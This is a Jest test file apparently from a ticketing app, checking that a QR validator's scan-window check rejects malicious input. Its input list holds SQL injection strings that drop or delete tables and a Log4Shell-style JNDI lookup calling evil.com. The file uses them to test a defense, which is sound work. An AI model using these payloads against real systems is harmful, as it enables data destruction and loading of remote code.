import { QRValidator } from '../src/services/QRValidator';

describe('SQL Injection Prevention', () => {
  const qrValidator = new QRValidator();
  
  const maliciousInputs = [
    "5'; DROP TABLE ticket_scans;--",
    "1 OR 1=1",
    "1' UNION SELECT NULL--",
    "1; DELETE FROM users;--",
    "${jndi:ldap://evil.com/a}"
  ];
  
  for (const payload of maliciousInputs) {
    it(`rejects injection attempt: ${payload}`, async () => {
      await expect(
        qrValidator.isRecentlyScanned('valid-uuid', payload as any)
      ).rejects.toThrow('Invalid window');
    });
  }
  
  it('accepts valid numeric input', async () => {
    const result = await qrValidator.isRecentlyScanned('ticket-123', 10);
    expect(typeof result).toBe('boolean');
  });
});
